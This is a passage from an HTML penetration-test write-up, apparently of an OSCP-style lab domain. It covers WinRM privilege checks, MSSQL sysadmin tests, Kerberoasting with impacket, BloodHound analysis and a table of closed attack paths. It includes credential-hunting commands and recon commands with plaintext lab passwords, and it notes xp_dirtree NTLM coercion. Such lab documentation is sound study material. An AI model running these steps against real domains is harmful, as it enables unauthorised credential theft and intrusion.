+<strong>full privileged token</strong> — no filtering. So if celia were a local admin on MS02, either
+<code>BUILTIN\Administrators</code> would appear in the group list, or the privileges would include the
+admin set.</p>
+<p>Neither is true. Therefore:</p>
+<blockquote>
+<p>celia.almeda is not a local administrator on MS02, and the potato family
+(<code>PrintSpoofer</code>, <code>GodPotato</code>, <code>JuicyPotato</code>) has nothing to abuse here.</p>
+</blockquote>
+<p>That closes the route that took MS01 in the previous leg. It is worth stating plainly because the same
+technique is the obvious reflex, and on this host it is a dead end.</p>
+<hr />
+<h3>2.4 What WinRM is not going to give us</h3>
+<p>Evil-WinRM runs commands as a <strong>network logon</strong> (type 3). That has a specific consequence for
+credential hunting:</p>
+<ul>
+<li>no <code>NL$</code> cached credential is created for this logon, so there is nothing new to dump;</li>
+<li>no Kerberos TGT is issued into the session, so <code>sekurlsa::tickets</code> has nothing to show;</li>
+<li><code>sekurlsa::logonpasswords</code> on this host would show <em>other</em> users' material if it existed, but LSASS
+  was already proven empty on MS01 in the previous leg.</li>
+</ul>
+<p>So the runbook here is files, not memory:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">type </span><span class="s2">&quot;$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt&quot;</span>
+<span class="n">cmdkey</span> <span class="p">/</span><span class="n">list</span>
+<span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Unattend&quot;</span> <span class="p">/</span><span class="n">s</span>
+<span class="nb">Get-ChildItem</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">celia</span><span class="p">.</span><span class="n">almeda</span> <span class="n">-Recurse</span> <span class="o">-File</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span> <span class="p">|</span>
+  <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Extension</span> <span class="n">-in</span> <span class="s1">&#39;.txt&#39;</span><span class="p">,</span><span class="s1">&#39;.xml&#39;</span><span class="p">,</span><span class="s1">&#39;.config&#39;</span><span class="p">,</span><span class="s1">&#39;.ini&#39;</span><span class="p">,</span><span class="s1">&#39;.ps1&#39;</span> <span class="p">}</span> <span class="p">|</span>
+  <span class="nb">Select-Object</span> <span class="n">-First</span> <span class="n">40</span> <span class="n">FullName</span>
+</pre></div>
+<p>Those are candidates, not results — nothing from that list is yet confirmed, and this chapter does not
+claim otherwise.</p>
+<hr />
+<h3>2.5 Position after this chapter</h3>
+<table>
+<thead>
+<tr>
+<th>Item</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Access</td>
+<td>interactive shell on MS02</td>
+</tr>
+<tr>
+<td>Integrity</td>
+<td>medium — standard user</td>
+</tr>
+<tr>
+<td>Local admin</td>
+<td>no</td>
+</tr>
+<tr>
+<td>SeImpersonate</td>
+<td>no</td>
+</tr>
+<tr>
+<td>Escalation from this token</td>
+<td><strong>none available</strong></td>
+</tr>
+<tr>
+<td>Session type</td>
+<td>network logon — no cache, no TGT</td>
+</tr>
+</tbody>
+</table>
+<p>The WinRM shell is now a <strong>reconnaissance platform and nothing more</strong>. Any further progress has to come
+from a service running in a different security context, which is what the next chapter tests.</p></div></section>
+<section class="chapter" id="ch-03" data-title="MSSQL"><div class="ch-head"><span class="ch-num">03</span><div class="ch-title"><h2>MSSQL</h2><p class="ch-sub">Two logins, <code>sysadmin = 0</code></p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>MS02 runs SQL Server, and two of the accounts we hold are SQL logins on it. This chapter records the
+test that decides whether SQL is an escalation path or a dead end — and, because it came back negative,
+what that rules out precisely.</p>
+<hr />
+<h3>3.1 Who we are in SQL</h3>
+<p>The prompt itself is the first finding:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">SQL (OSCP\web_svc  guest@master)&gt;</span></pre></div>
+<p>Read right to left: database <code>master</code>, host <code>guest</code>, login <code>OSCP\web_svc</code>. And <code>guest</code> is MS02 — the
+same box the WinRM shell is on, not a separate database server. The same session run as the other
+account gives the mirror image:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">SQL (OSCP\celia.almeda  guest@master)&gt;</span></pre></div>
+<p>Two independent domain accounts, both with a SQL login on the same instance.</p>
+<hr />
+<h3>3.2 The only question that matters</h3>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">SELECT</span><span class="w"> </span><span class="k">SYSTEM_USER</span><span class="p">,</span><span class="w"> </span><span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">);</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">-   -
+0   0</span></pre></div>
+<p>And as celia:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">SQL</span><span class="w"> </span><span class="p">(</span><span class="n">OSCP</span><span class="err">\</span><span class="n">celia</span><span class="p">.</span><span class="n">almeda</span><span class="w">  </span><span class="n">guest</span><span class="o">@</span><span class="n">master</span><span class="p">)</span><span class="o">&gt;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">SYSTEM_USER</span><span class="p">,</span><span class="w"> </span><span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">);</span>
+<span class="o">-</span><span class="w">   </span><span class="mi">0</span>
+</pre></div>
+<p>The decisive column is <code>IS_SRVROLEMEMBER('sysadmin')</code> — <strong><code>0</code> for both logins.</strong> Neither is a member of
+<code>sysadmin</code>.</p>
+<p>One note on reading this output: the first column came back as <code>0</code> rather than the login name, and the
+prompt (<code>OSCP\web_svc</code>, <code>OSCP\celia.almeda</code>) is the authoritative statement of identity here. The
+sysadmin answer is unaffected by that quirk — it is the second value, and it is zero in both cases.</p>
+<hr />
+<h3>3.3 What <code>sysadmin = 0</code> actually closes</h3>
+<p>This is worth being exact about, because "not sysadmin" is not "no SQL attack surface".</p>
+<p>Closed:</p>
+<ul>
+<li><code>xp_cmdshell</code> execution — it requires <code>sysadmin</code> or <code>CONTROL SERVER</code>;</li>
+<li><code>sp_configure</code> changes — same requirement;</li>
+<li>reading other databases' data — a login without <code>sysadmin</code> only sees what it has been granted;</li>
+<li><code>EXECUTE AS LOGIN = 'sa'</code> — impersonation needs an explicit <code>IMPERSONATE</code> grant.</li>
+</ul>
+<p>Still open, and deliberately not yet exercised:</p>
+<ul>
+<li><strong><code>xp_dirtree</code> / <code>xp_fileexist</code></strong> — executable by <code>public</code> by default. Pointing <code>xp_dirtree</code> at an
+  SMB listener coaxes the <strong>SQL service account</strong> into an outbound NTLM authentication, which is a
+  credential from a different security context than either login we hold. This is the single most
+  promising remaining SQL primitive, and it requires no privilege at all.</li>
+<li><strong><code>IMPERSONATE</code> grants</strong> — checked per-login, not per-role; a specific grant could exist even with
+  role membership at zero.</li>
+<li><strong>Linked servers</strong> — <code>sp_linkedservers</code> may expose a second instance with different rights.</li>
+</ul>
+<p>Both of those are queries to run, not findings. This chapter does not claim either returned anything.</p>
+<hr />
+<h3>3.4 The escalation that would have mattered</h3>
+<p>Had either login been <code>sysadmin</code>, the chain would have been:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">sysadmin → xp_cmdshell → runs as the MSSQL service account → whoami /priv
+         → SeImpersonate on the service account? → SYSTEM on MS02</span></pre></div>
+<p>Note the shape of it: <code>xp_cmdshell</code> does not run as <em>you</em>. It runs as the account the SQL service is
+configured with. That is why a SQL login is worth more than its own rights suggest — it is a way to
+borrow someone else's token. With <code>sysadmin = 0</code> for both accounts, that borrowing is unavailable.</p>
+<hr />
+<h3>3.5 Position after this chapter</h3>
+<table>
+<thead>
+<tr>
+<th>Path</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SQL sysadmin (<code>web_svc</code>)</td>
+<td><strong>no</strong></td>
+</tr>
+<tr>
+<td>SQL sysadmin (<code>celia.almeda</code>)</td>
+<td><strong>no</strong></td>
+</tr>
+<tr>
+<td><code>xp_cmdshell</code></td>
+<td>unavailable without sysadmin</td>
+</tr>
+<tr>
+<td><code>xp_dirtree</code> hash capture</td>
+<td><strong>untested</strong> — available to <code>public</code></td>
+</tr>
+<tr>
+<td>Linked servers / IMPERSONATE</td>
+<td><strong>untested</strong></td>
+</tr>
+</tbody>
+</table>
+<p>Combined with chapter 02, the local picture on MS02 is now:</p>
+<table>
+<thead>
+<tr>
+<th>Local path</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SMB shares (<code>web_svc</code>)</td>
+<td>dead — <code>ADMIN$</code>/<code>C$</code> empty</td>
+</tr>
+<tr>
+<td>WinRM privesc (<code>celia.almeda</code>)</td>
+<td>dead — no <code>SeImpersonate</code>, medium integrity</td>
+</tr>
+<tr>
+<td>SQL sysadmin (either login)</td>
+<td>dead — <code>0</code> / <code>0</code></td>
+</tr>
+</tbody>
+</table>
+<p>MS02 does not fall from anything we can do <strong>on</strong> MS02. Whatever remains is in the directory, which is
+chapter 04.</p></div></section>
+<section class="chapter" id="ch-04" data-title="Domain reconnaissance"><div class="ch-head"><span class="ch-num">04</span><div class="ch-title"><h2>Domain reconnaissance</h2><p class="ch-sub">DC01 direct, and a Kerberoast that did not run</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>With MS02 closed on every local axis, the directory becomes the target. This chapter locates the DC,
+establishes what a domain user can read, and starts the one attack that does not need privilege:
+Kerberoasting.</p>
+<hr />
+<h3>4.1 Where the DC is, from inside the domain</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="n">nltest</span> <span class="p">/</span><span class="n">dsgetdc</span><span class="p">:</span><span class="n">oscp</span><span class="p">.</span><span class="n">exam</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">           DC: \\DC01.oscp.exam
+      Address: \\10.10.152.140
+     Dom Guid: e7448cc9-434a-4130-90b0-812d3d0c5a96
+     Dom Name: oscp.exam
+  Forest Name: oscp.exam
+ Dc Site Name: Default-First-Site-Name
+Our Site Name: Default-First-Site-Name
+        Flags: PDC GC DS LDAP KDC TIMESERV GTIMESERV WRITABLE DNS_DC DNS_DOMAIN
+               DNS_FOREST CLOSE_SITE FULL_SECRET WS DS_8 DS_9 DS_10 KEYLIST</span></pre></div>
+<p>Three things worth extracting:</p>
+<p><strong><code>DC01</code> is <code>10.10.152.140</code></strong> — routable from Kali directly. No tunnel, no <code>proxychains</code>.</p>
+<p><strong><code>Dom Guid e7448cc9-…</code></strong> matches the GUID recorded on the earlier AD page, where the DC sat at
+<code>10.10.118.146</code>. Same directory, different address.</p>
+<p><strong><code>TIMESERV GTIMESERV</code></strong> — the DC advertises itself as a time source. That is a hint about a problem
+that shows up in section 4.4, and it also tells you where to point the clock.</p>
+<hr />
+<h3>4.2 What a domain user can read on a DC</h3>
+<p><code>eric.wallows</code> was carried over from the previous leg, and the password still works:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-u<span class="w"> </span>eric.wallows<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;EricLikesRunning800&#39;</span>
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-u<span class="w"> </span>eric.wallows<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;EricLikesRunning800&#39;</span><span class="w"> </span>--shares
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">SMB  10.10.152.140  445  DC01  [*] Windows 10 / Server 2019 Build 17763 x64
+                                  (name:DC01) (domain:oscp.exam) (signing:True)
+                                  (SMBv1:None) (Null Auth:True)
+SMB  10.10.152.140  445  DC01  [+] oscp.exam\eric.wallows:EricLikesRunning800
+SMB  10.10.152.140  445  DC01  [*] Enumerated shares
+SMB  10.10.152.140  445  DC01      Share           Permissions     Remark
+SMB  10.10.152.140  445  DC01      -----           -----------     ------
+SMB  10.10.152.140  445  DC01      ADMIN$                          Remote Admin
+SMB  10.10.152.140  445  DC01      C$                              Default share
+SMB  10.10.152.140  445  DC01      IPC$            READ            Remote IPC
+SMB  10.10.152.140  445  DC01      NETLOGON        READ            Logon server share
+SMB  10.10.152.140  445  DC01      SYSVOL          READ            Logon server share
+SMB  10.10.152.140  445  DC01      Users           READ</span></pre></div>
+<p><code>NETLOGON</code>, <code>SYSVOL</code> and the blank <code>ADMIN$</code>/<code>C$</code> are the default picture — every authenticated user
+reads the first two and nobody reads the last two without admin. <strong><code>Users</code> is not a default share on a
+domain controller.</strong> A custom share holding user data, readable by a plain domain user, is exactly the
+kind of thing that leaks a script, a key, or a second credential. It has not been enumerated yet; it is
+recorded here as the highest-value unexamined surface.</p>
+<p>Note also <code>signing:True</code> here against <code>signing:False</code> on MS02 — DC01 is hardened on that axis, so relay
+work, if any, has to point at MS02.</p>
+<hr />
+<h3>4.3 Collecting the directory</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>bloodhound-python<span class="w"> </span>-d<span class="w"> </span>oscp.exam<span class="w"> </span>-u<span class="w"> </span>celia.almeda<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;7k8XHk3dMtmpnC7&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-ns<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-dc<span class="w"> </span>DC01.oscp.exam<span class="w"> </span>-c<span class="w"> </span>All
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">INFO: Found AD domain: oscp.exam
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication.
+         Error: [Errno Connection error (DC01.oscp.exam:88)]
+                [Errno -2] Name or service not known
+INFO: Connecting to LDAP server: DC01.oscp.exam
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 3 computers
+INFO: Found 31 users
+INFO: Found 57 groups
+INFO: Found 2 gpos
+INFO: Found 6 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: MS01.oscp.exam
+INFO: Querying computer: MS02.oscp.exam
+INFO: Querying computer: DC01.oscp.exam
+INFO: Done in 00M 15S</span></pre></div>
+<p>The warning matters as much as the output. <code>DC01.oscp.exam</code> does not resolve on this host — Kerberos
+needs a name, not an IP, so the collector fell back to NTLM against LDAP. It still produced a graph,
+but a thinner one: session and local-group collection came back empty across all three computers
+(chapter 05).</p>
+<p>The fix is one line and it is the same fix the Kerberoast needs:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;10.10.152.140 DC01.oscp.exam oscp.exam&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
+</pre></div>
+<hr />
+<h3>4.4 Kerberoasting — and the two things that stopped it</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>impacket-GetUserSPNs<span class="w"> </span>oscp.exam/celia.almeda:<span class="s1">&#39;7k8XHk3dMtmpnC7&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-request
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">ServicePrincipalName   Name     MemberOf  PasswordLastSet              LastLogon
+---------------------  -------  --------  ---------------------------  --------------------------
+MSSQL/MS02.oscp.exam   sql_svc            2022-12-05 05:49:44.637096   2022-11-10 03:15:51.783016
+HTTP/MS01.oscp.exam    web_svc            2022-11-10 23:11:19.795439   2026-11-22 22:55:09.482611
+
+[-] CCache file is not found. Skipping...
+[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</span></pre></div>
+<p>The SPN list came back over LDAP — that part worked. The roast itself did not, for two compounding
+reasons:</p>
+<p><strong>No TGT.</strong> <code>CCache file is not found</code> — <code>DC01.oscp.exam</code> does not resolve, so no Kerberos ticket was
+ever obtained. Without a TGT, <code>GetUserSPNs</code> can enumerate but cannot request service tickets.</p>
+<p><strong>Clock skew.</strong> <code>KRB_AP_ERR_SKEW</code> — Kerberos rejects tickets when the client clock is more than five
+minutes off the KDC's. This is a VM, and a suspended VM drifts. The DC advertises <code>TIMESERV GTIMESERV</code>,
+which is both the diagnosis and the remedy:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>sudo<span class="w"> </span>ntpdate<span class="w"> </span>-u<span class="w"> </span><span class="m">10</span>.10.152.140
+</pre></div>
+<p>Both must be fixed before the roast can run; fixing one alone still fails.</p>
+<hr />
+<h3>4.5 The target is <code>sql_svc</code>, not <code>web_svc</code></h3>
+<p>The table names two roastable accounts, and they are not equally useful:</p>
+<table>
+<thead>
+<tr>
+<th>Account</th>
+<th>SPN</th>
+<th>Password last set</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sql_svc</code></td>
+<td><code>MSSQL/MS02.oscp.exam</code></td>
+<td><strong>2022-12-05</strong></td>
+<td>the MSSQL service account on MS02 — never rotated</td>
+</tr>
+<tr>
+<td><code>web_svc</code></td>
+<td><code>HTTP/MS01.oscp.exam</code></td>
+<td>2022-11-10</td>
+<td>already owned: <code>Diamond1</code></td>
+</tr>
+</tbody>
+</table>
+<p>Roasting <code>web_svc</code> proves a password we already hold. <code>sql_svc</code> is the one that matters, for a reason
+that connects straight back to chapter 03: <code>xp_cmdshell</code> runs as the SQL service account, and
+<code>sql_svc</code> is that account. A cracked <code>sql_svc</code> is a different security context on MS02 — one that may
+carry <code>SeImpersonatePrivilege</code>, which neither of our logins does.</p>
+<p>A service account whose password has not changed in four years is also just statistically likely to be
+weak.</p>
+<hr />
+<h3>4.6 Position after this chapter</h3>
+<table>
+<thead>
+<tr>
+<th>Question</th>
+<th>Answer</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>DC reachable directly?</td>
+<td><strong>Yes</strong> — <code>10.10.152.140</code></td>
+</tr>
+<tr>
+<td>Does name resolution work?</td>
+<td><strong>No</strong> — <code>DC01.oscp.exam</code> unresolved</td>
+</tr>
+<tr>
+<td>Does Kerberos work?</td>
+<td><strong>No</strong> — no TGT, and clock skew</td>
+</tr>
+<tr>
+<td>Kerberoastable accounts</td>
+<td><code>sql_svc</code>, <code>web_svc</code></td>
+</tr>
+<tr>
+<td>Roast completed?</td>
+<td><strong>No</strong> — blocked on DNS + clock</td>
+</tr>
+<tr>
+<td>Custom DC share found</td>
+<td><code>Users</code>, READ as <code>eric.wallows</code></td>
+</tr>
+</tbody>
+</table>
+<p>Two mechanical fixes (a hosts entry and a clock sync) unblock the roast. That is the next action, not a
+finding.</p></div></section>
+<section class="chapter" id="ch-05" data-title="BloodHound"><div class="ch-head"><span class="ch-num">05</span><div class="ch-title"><h2>BloodHound</h2><p class="ch-sub">Zero outbound edges, and one stale service account</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>A BloodHound collection is only worth what you extract from it. This chapter answers one question for
+each of our accounts: <strong>is there any object in this directory we can write to?</strong> The answer is no, and
+the way it is no is worth documenting, because it redirects the whole engagement back to credential
+attack.</p>
+<hr />
+<h3>5.1 Who actually is Domain Admin</h3>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">DOMAIN ADMINS@OSCP.EXAM
+   -&gt; TOM_ADMIN@OSCP.EXAM
+   -&gt; ADMINISTRATOR@OSCP.EXAM
+
+ENTERPRISE ADMINS@OSCP.EXAM
+   -&gt; ADMINISTRATOR@OSCP.EXAM
+
+GROUP POLICY CREATOR OWNERS@OSCP.EXAM
+   -&gt; ADMINISTRATOR@OSCP.EXAM</span></pre></div>
+<p><code>TOM_ADMIN</code> is the interesting name: a human-looking administrative account alongside the built-in
+<code>Administrator</code>. Those are the two identities that end this engagement. Everything else is a means of
+becoming one of them.</p>
+<hr />
+<h3>5.2 The question that decides the path</h3>
+<p>For each account we hold, scan <strong>every object in the directory</strong> for an ACE whose principal is that
+account:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">OUTBOUND EDGES: objects our accounts can CONTROL
+  NONE. Our accounts hold no delegated rights over any object in this dataset.</span></pre></div>
+<p>Not "few". None. <code>celia.almeda</code>, <code>web_svc</code> and <code>eric.wallows</code> hold no <code>GenericAll</code>, <code>GenericWrite</code>,
+<code>WriteDacl</code>, <code>WriteOwner</code>, <code>ForceChangePassword</code>, <code>AddKeyCredentialLink</code>, <code>DCSync</code> or <code>AddMember</code>
+anywhere.</p>
+<p>Their group memberships confirm it independently — none of them is in the delegated business groups:</p>
+<table>
+<thead>
+<tr>
+<th>Group</th>
+<th>Members</th>
+<th>Ours?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ADMIN</code></td>
+<td>Donna Johnson, Luke Martin, Chelsea Byrne, Sandra Craig, Leonard Morris</td>
+<td>no</td>
+</tr>
+<tr>
+<td><code>IT</code></td>
+<td>Oliver Gray, Kenneth Coles, Carol Webb</td>
+<td>no</td>
+</tr>
+<tr>
+<td><code>FINANCE</code></td>
+<td>Shane Mitchell, Jamie Thomas, Linda Patel, Emily Bishop, Lawrence Kay</td>
+<td>no</td>
+</tr>
+<tr>
+<td><code>HR</code></td>
+<td>Joan North, Jane Booth, Frank Farrell</td>
+<td>no</td>
+</tr>
+<tr>
+<td><code>MARKETING</code></td>
+<td>Janice Turner, Thomas Robinson, Aimee Hunt, Georgina Begum</td>
+<td>no</td>
+</tr>
+<tr>
+<td><code>IIS_IUSRS</code></td>
+<td><code>OSCP.EXAM-S-1-5-17</code></td>
+<td>no</td>
+</tr>
+</tbody>
+</table>
+<p>That is a clean negative result, and it is the most important sentence in this chapter: <strong>there is no
+ACL path to Domain Admin from the accounts currently held.</strong> ACL work, <code>GenericAll</code> abuse, <code>WriteDacl</code>
+chains — all of it is off the table until a new account is acquired.</p>
+<hr />
+<h3>5.3 Two other paths, both closed</h3>
+<p><strong>LAPS is not deployed.</strong> <code>haslaps</code> is <code>false</code> on all three computers, so local administrator passwords
+are not randomised and not readable. There is no <code>ReadLAPSPassword</code> shortcut because there is no LAPS.</p>
+<p><strong>There are no sessions to steal.</strong> Session collection returned <code>collected=true</code> with <strong>zero results</strong>
+on all three computers:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">MS02.OSCP.EXAM   sessions[collected=True n=0]
+MS01.OSCP.EXAM   sessions[collected=True n=0]
+DC01.OSCP.EXAM   sessions[collected=True n=0]</span></pre></div>
+<p>No Domain Admin is logged on to a member server, so there is nothing to relay or impersonate on MS02
+despite its SMB signing being off. This may partly be an artefact of the NTLM fallback in chapter 04 —
+a Kerberos-backed collection could show sessions this run missed — so treat it as "not observed" rather
+than "proven absent".</p>
+<p>DC01's local administrators are the default trio (<code>Administrator</code>, <code>Enterprise Admins</code>,
+<code>Domain Admins</code>) — correct for a domain controller, and offering nothing.</p>
+<hr />
+<h3>5.4 Reading the export correctly</h3>
+<p>One trap cost time here and is worth recording.</p>
+<p>In a <code>bloodhound-python</code> legacy export, each object's <code>Aces</code> array contains ACEs <strong>on that object</strong>. For
+an inbound ACE, <code>PrincipalSID</code> is the <strong>grantor</strong> — the principal who holds the right — not the object's
+owner. Filtering <code>Aces</code> on a user therefore answers "<em>who can control this user</em>", not "<em>what can this
+user control</em>".</p>
+<p>Read the wrong way, every user in the domain appears to hold <code>GenericAll</code> over <code>Domain Admins</code>, which is
+nonsense on its face: the same four rights appear identically for unrelated accounts, and the
+<code>PrincipalSID</code> resolves to <code>-512</code> (<code>Domain Admins</code>) rather than to the user.</p>
+<p>The correct question — <em>what can this account control</em> — requires scanning <strong>all</strong> objects and matching
+<code>PrincipalSID</code> against our accounts' SIDs. That is what section 5.2 does, and it comes back empty.</p>
+<hr />
+<h3>5.5 What the graph does tell us</h3>
+<table>
+<thead>
+<tr>
+<th>Fact</th>
+<th>Consequence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>DA = <code>TOM_ADMIN</code>, <code>Administrator</code></td>
+<td>these are the two end states</td>
+</tr>
+<tr>
+<td>No outbound ACEs for our accounts</td>
+<td>ACL abuse unavailable</td>
+</tr>
+<tr>
+<td>Not in <code>ADMIN</code>/<code>IT</code>/<code>FINANCE</code>/…</td>
+<td>no group-derived privilege</td>
+</tr>
+<tr>
+<td>No LAPS</td>
+<td>no local-admin password shortcut</td>
+</tr>
+<tr>
+<td>No sessions observed</td>
+<td>relay/impersonation has no target</td>
+</tr>
+<tr>
+<td><code>sql_svc</code> password last set 2022-12-05</td>
+<td>a stale, roastable service account</td>
+</tr>
+<tr>
+<td><code>web_svc</code> password last set 2022-11-10</td>
+<td>already owned</td>
+</tr>
+</tbody>
+</table>
+<p>Every row points the same way. With no writable object and no privileged session, the only remaining
+lever is <strong>a credential we do not yet have</strong> — and the graph names the best candidate: <code>sql_svc</code>.</p>
+<p>That converges exactly with chapter 03 (the SQL service account is the context <code>xp_cmdshell</code> would run
+in) and chapter 04 (it is Kerberoastable). Three independent lines of reasoning, one target.</p>
+<hr />
+<h3>5.6 Position after this chapter</h3>
+<table>
+<thead>
+<tr>
+<th>Path</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ACL abuse</td>
+<td><strong>closed</strong> — zero outbound rights</td>
+</tr>
+<tr>
+<td>Group-derived privilege</td>
+<td><strong>closed</strong> — not in any delegated group</td>
+</tr>
+<tr>
+<td>LAPS read</td>
+<td><strong>closed</strong> — not deployed</td>
+</tr>
+<tr>
+<td>Session theft / relay</td>
+<td><strong>no target observed</strong></td>
+</tr>
+<tr>
+<td>Kerberoast <code>sql_svc</code></td>
+<td><strong>open</strong> — blocked only on DNS + clock</td>
+</tr>
+<tr>
+<td>DC01 <code>Users</code> share</td>
+<td><strong>unexamined</strong></td>
+</tr>
+<tr>
+<td>SQL <code>xp_dirtree</code> capture</td>
+<td><strong>untested</strong></td>
+</tr>
+</tbody>
+</table>
+<p>The engagement is now purely a credential problem, and there are two candidate sources: a roastable
+service account and an unexamined share on the DC.</p></div></section>
+<section class="chapter" id="ch-06" data-title="What is ruled out"><div class="ch-head"><span class="ch-num">06</span><div class="ch-title"><h2>What is ruled out</h2><p class="ch-sub">Seven paths, each closed with evidence</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>This page is published <strong>at the state of the engagement, not at the end of it.</strong> This chapter is the
+negative half: everything that has been tested and closed, each with the evidence that closed it. The
+next chapter is the plan.</p>
+<p>Recording negatives properly is not bookkeeping. Seven paths were eliminated here, and each one
+cost a command; without this page they get re-tested.</p>
+<hr />
+<h3>6.1 What is owned</h3>
+<table>
+<thead>
+<tr>
+<th>Item</th>
+<th>Evidence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>WinRM shell on MS02 as <code>celia.almeda</code></td>
+<td>chapter 02</td>
+</tr>
+<tr>
+<td>Three domain credentials</td>
+<td>chapters 01, 04</td>
+</tr>
+<tr>
+<td>Read access to DC01 <code>NETLOGON</code> / <code>SYSVOL</code> / <code>Users</code></td>
+<td>chapter 04</td>
+</tr>
+<tr>
+<td>A complete map of the directory</td>
+<td>chapter 05</td>
+</tr>
+</tbody>
+</table>
+<p>No host is at SYSTEM. No domain admin has been obtained. <code>proof.txt</code> has not been read.</p>
+<hr />
+<h3>6.2 The closed list</h3>
+<table>
+<thead>
+<tr>
+<th>Path</th>
+<th>Evidence it is closed</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SMB share access on MS02</td>
+<td><code>ADMIN$</code> and <code>C$</code> return <strong>no permissions</strong> for <code>web_svc</code></td>
+</tr>
+<tr>
+<td>WinRM privilege escalation</td>
+<td>token is <strong>medium integrity</strong>, not local admin — see 6.3</td>
+</tr>
+<tr>
+<td>Potato family (<code>PrintSpoofer</code>/<code>GodPotato</code>)</td>
+<td>requires <code>SeImpersonate</code> — <strong>absent</strong> from the token</td>
+</tr>
+<tr>
+<td>SQL sysadmin</td>
+<td><code>IS_SRVROLEMEMBER('sysadmin')</code> = <strong><code>0</code></strong> for both SQL logins</td>
+</tr>
+<tr>
+<td><code>xp_cmdshell</code></td>
+<td>needs <code>sysadmin</code>/<code>CONTROL SERVER</code> — unavailable at <code>0</code></td>
+</tr>
+<tr>
+<td>ACL abuse</td>
+<td><strong>zero</strong> outbound ACEs across the entire directory</td>
+</tr>
+<tr>
